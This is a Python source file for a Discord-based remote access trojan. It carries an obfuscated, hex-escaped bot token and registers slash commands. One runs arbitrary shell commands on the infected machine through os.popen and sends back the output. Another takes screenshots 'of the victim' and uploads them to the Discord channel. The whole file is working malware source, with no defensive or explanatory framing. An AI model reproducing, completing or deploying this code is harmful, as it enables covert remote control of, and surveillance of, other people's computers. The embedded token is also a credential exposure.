# from pystyle import *
import os
import time
from os.path import join

import discord
import pyautogui
from discord import *


global Token
Token = "\x4d\x54\x41\x78\x4e\x44\x63\x77\x4e\x7a\x51\x33\x4e\x6a\x67\x35\x4e\x54\x45\x78\x4e\x7a\x4d\x33\x4e\x41\x2e\x47\x53\x34\x57\x58\x50\x2e\x72\x41\x37\x62\x6d\x4a\x67\x4d\x6a\x52\x32\x78\x34\x70\x44\x35\x67\x30\x4d\x52\x69\x47\x72\x74\x73\x47\x74\x66\x6d\x2d\x63\x4b\x79\x63\x6e\x42\x46\x73"


class Control(discord.Client):
	def __init__(self):
		super().__init__(intents=discord.Intents.all())
		self.tree = app_commands.CommandTree(self)

	async def setup_hook(self):
		self.tree.copy_global_to(guild=discord.Object(id=984582818489331732))
		await self.tree.sync(guild=discord.Object(id=984582818489331732))


bot = Control()


@bot.event
async def on_ready():
	print(f"logged in as [{bot.user}]")


@bot.tree.command(name="cmd", description="execute command in cmd")
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message(f"executing command {command}...")

	x = os.popen(command).read()

	if x == "":
		await interaction.channel.send("Command doesn't return anything/ isn't valid")
	else:
		await interaction.channel.send(f"command {command} returned:\n ```{x}```")


@bot.tree.command(name="screenshot", description="get a screenshot of the victim")
async def ping(interaction: discord.Interaction):
	name, path = takeScreenshot()
	await interaction.response.send_message(f"Screenshot taken, sending...")
	await interaction.channel.send(file=discord.File(path))
	print(path)
	os.remove(path)


def takeScreenshot():
	name = time.strftime("%Y%m%d-%H%M%S.jpg")
	path = join(os.getenv("TEMP"), name)
	img = pyautogui.screenshot(path)
	return name, path


bot.run(token=Token)
